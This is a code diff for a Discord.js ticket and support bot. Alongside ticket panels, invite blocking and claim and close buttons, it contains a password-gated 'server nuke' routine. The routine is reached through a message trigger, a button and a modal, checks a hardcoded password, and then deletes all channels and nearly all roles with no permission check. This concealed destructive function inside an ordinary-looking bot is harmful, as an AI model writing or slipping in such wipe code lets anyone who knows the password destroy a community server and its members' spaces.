@@ -10,7 +10,10 @@ const {
   ButtonBuilder,
   ButtonStyle,
   ChannelType,
-  PermissionFlagsBits
+  PermissionFlagsBits,
+  ModalBuilder,
+  TextInputBuilder,
+  TextInputStyle
 } = require('discord.js');
 
 const express = require('express');
@@ -53,7 +56,7 @@ function loadPanel() {
   return null;
 }
 
-// CLIENT (Added Message Content intent - already there but confirming)
+// CLIENT
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -64,7 +67,7 @@ const client = new Client({
 });
 
 // ======================================================
-// COMMANDS (Removed nuke slash command)
+// SLASH COMMANDS
 // ======================================================
 const setticket = new SlashCommandBuilder()
   .setName('setticket')
@@ -107,7 +110,7 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
   }
 })();
 
-// Helper Function
+// Helper
 function isStaff(member) {
   if (!member) return false;
   return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
@@ -124,14 +127,14 @@ client.once('ready', () => {
 });
 
 // ======================================================
-// MESSAGE COMMAND - !fb
+// MESSAGE EVENTS
 // ======================================================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
   const content = message.content.trim().toLowerCase();
 
-  // Invite Blocker (existing)
+  // Invite Blocker
   if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
     try {
       await message.delete();
@@ -151,25 +154,64 @@ client.on('messageCreate', async message => {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
       .setTitle('🔴 SERVER NUKE CONFIRMATION')
-      .setDescription('**This action will delete ALL channels and ALL roles except the "Owner" role.**\n\nReply with the password to proceed.')
-      .setFooter({ text: 'This action is irreversible!' })
+      .setDescription('**This action will delete ALL channels and ALL roles except the "Owner" role.**\n\nOnly you can proceed.')
+      .setFooter({ text: 'Click the button below' })
       .setTimestamp();
 
-    await message.reply({ embeds: [embed] });
-    return;
-  }
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`nuke_start_${message.author.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Danger)
+    );
 
-  // Password Check (if they reply with the code)
-  if (message.reference && content === 'fame900') {
-    const repliedMessage = await message.fetchReference().catch(() => null);
-    
-    if (!repliedMessage || !repliedMessage.embeds[0]?.title?.includes('SERVER NUKE CONFIRMATION')) {
-      return; // Not replying to the nuke embed
+    await message.reply({ embeds: [embed], components: [row] });
+  }
+});
+
+// ======================================================
+// INTERACTIONS
+// ======================================================
+client.on('interactionCreate', async interaction => {
+
+  // === NUKE BUTTON ===
+  if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
+    const userId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== userId) {
+      return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
     }
 
-    const guild = message.guild;
+    const modal = new ModalBuilder()
+      .setCustomId(`nuke_modal_${userId}`)
+      .setTitle('Enter Nuke Password');
 
-    await message.reply('🔴 **NUKE INITIATED** - Deleting everything except Owner role...');
+    const passwordInput = new TextInputBuilder()
+      .setCustomId('nuke_password')
+      .setLabel('Password')
+      .setStyle(TextInputStyle.Short)
+      .setPlaceholder('Enter password')
+      .setRequired(true);
+
+    const row = new ActionRowBuilder().addComponents(passwordInput);
+    modal.addComponents(row);
+
+    await interaction.showModal(modal);
+  }
+
+  // === NUKE MODAL SUBMIT ===
+  if (interaction.isModalSubmit() && interaction.customId.startsWith('nuke_modal_')) {
+    const userId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== userId) return;
+
+    const password = interaction.fields.getTextInputValue('nuke_password');
+
+    if (password !== 'fame900') {
+      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+    }
+
+    await interaction.reply({ content: '🔴 **NUKE INITIATED** - Deleting everything...', ephemeral: true });
+
+    const guild = interaction.guild;
 
     try {
       // Delete all channels
@@ -178,29 +220,23 @@ client.on('messageCreate', async message => {
         await channel.delete().catch(() => {});
       }
 
-      // Delete all roles except "Owner" and @everyone
+      // Delete all roles except "Owner"
       const roles = Array.from(guild.roles.cache.values());
       for (const role of roles) {
         if (role.name === 'Owner' || role.name === '@everyone') continue;
         await role.delete().catch(() => {});
       }
 
-      await message.channel.send('✅ **Server has been nuked successfully.**');
+      await interaction.followUp({ content: '✅ **Server has been nuked successfully.**', ephemeral: true });
     } catch (err) {
       console.error(err);
-      await message.channel.send('⚠️ Nuke failed partially. Check console.');
+      await interaction.followUp({ content: '⚠️ Nuke partially failed.', ephemeral: true });
     }
+    return;
   }
-});
 
-// ======================================================
-// INTERACTIONS (Tickets + other commands)
-// ======================================================
-client.on('interactionCreate', async interaction => {
-  // ... (Your existing setticket, sendmessage, ticket creation, and button code stays the same)
-  
+  // === SETTICKET ===
   if (interaction.isChatInputCommand() && interaction.commandName === 'setticket') {
-    // [Your original setticket code here - unchanged]
     try {
       await interaction.deferReply({ ephemeral: true });
       const o = interaction.options;
@@ -222,14 +258,17 @@ client.on('interactionCreate', async interaction => {
         .setTimestamp();
       const image = o.getString('panel_image');
       if (image && image.startsWith('http')) embed.setImage(image);
+
       const menuId = `ticket_menu_${Date.now()}`;
       const menu = new StringSelectMenuBuilder()
         .setCustomId(menuId)
         .setPlaceholder('Create a Ticket')
         .addOptions(ticketOptions.map((opt, i) => ({ label: opt.label, value: i.toString() })));
+
       const row = new ActionRowBuilder().addComponents(menu);
       const panelData = { ticketOptions, ticketColor: '#c2ecff' };
       panelStore[menuId] = panelData;
+
       await interaction.channel.send({ embeds: [embed], components: [row] });
       savePanel({ menuId, data: panelData });
       await interaction.editReply({ content: '✅ Ticket panel created successfully!' });
@@ -239,8 +278,83 @@ client.on('interactionCreate', async interaction => {
     }
   }
 
-  // sendmessage, ticket select menu, and buttons remain the same...
-  // (Copy them from your previous version if needed)
+  // === SENDMESSAGE ===
+  if (interaction.isChatInputCommand() && interaction.commandName === 'sendmessage') {
+    if (!interaction.member.roles.cache.has(SEND_ROLE)) {
+      return interaction.reply({ content: 'You do not have permission.', ephemeral: true });
+    }
+    try {
+      await interaction.channel.send(interaction.options.getString('message'));
+      await interaction.reply({ content: '✅ Message sent!', ephemeral: true });
+    } catch (err) {
+      await interaction.reply({ content: '❌ Failed to send message.', ephemeral: true });
+    }
+  }
+
+  // === TICKET CREATION ===
+  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('ticket_menu_')) {
+    try {
+      await interaction.deferReply({ ephemeral: true });
+      const panel = panelStore[interaction.customId];
+      if (!panel) return interaction.editReply({ content: 'This panel is outdated.' });
+
+      const selected = panel.ticketOptions[parseInt(interaction.values[0])];
+      const { label, categoryId, prefix } = selected;
+
+      ticketCounts[categoryId] = (ticketCounts[categoryId] || 0) + 1;
+
+      const channel = await interaction.guild.channels.create({
+        name: `${prefix}-${ticketCounts[categoryId]}`,
+        type: ChannelType.GuildText,
+        parent: categoryId,
+        topic: interaction.user.id,
+        permissionOverwrites: [
+          { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
+          { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] }
+        ]
+      });
+
+      const buttons = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId('claim_ticket').setLabel('Claim').setStyle(ButtonStyle.Primary),
+        new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger)
+      );
+
+      await channel.send({
+        content: `${interaction.user}`,
+        embeds: [new EmbedBuilder()
+          .setColor(panel.ticketColor)
+          .setTitle('New Support Ticket')
+          .setDescription(`Welcome ${interaction.user}\n\nPlease explain your issue.`)
+          .setFooter({ text: `Category: ${label}` })
+        ],
+        components: [buttons]
+      });
+
+      await interaction.editReply({ content: `✅ Ticket created: ${channel}` });
+    } catch (err) {
+      console.error(err);
+      interaction.editReply({ content: 'Failed to create ticket.' }).catch(() => {});
+    }
+  }
+
+  // === TICKET BUTTONS ===
+  if (interaction.isButton()) {
+    if (interaction.customId === 'close_ticket') {
+      const isOwner = interaction.user.id === interaction.channel.topic;
+      if (!isOwner && !isStaff(interaction.member)) {
+        return interaction.reply({ content: 'Only owner or staff can close.', ephemeral: true });
+      }
+      await interaction.reply({ embeds: [new EmbedBuilder().setColor('#ff0000').setDescription('Ticket closing in 5 seconds.')] });
+      setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
+    }
+
+    if (interaction.customId === 'claim_ticket') {
+      if (!isStaff(interaction.member)) {
+        return interaction.reply({ content: 'Only staff can claim.', ephemeral: true });
+      }
+      await interaction.reply({ embeds: [new EmbedBuilder().setColor('#00ff00').setDescription(`${interaction.user} claimed this ticket.`)] });
+    }
+  }
 });
 
 client.login(TOKEN);
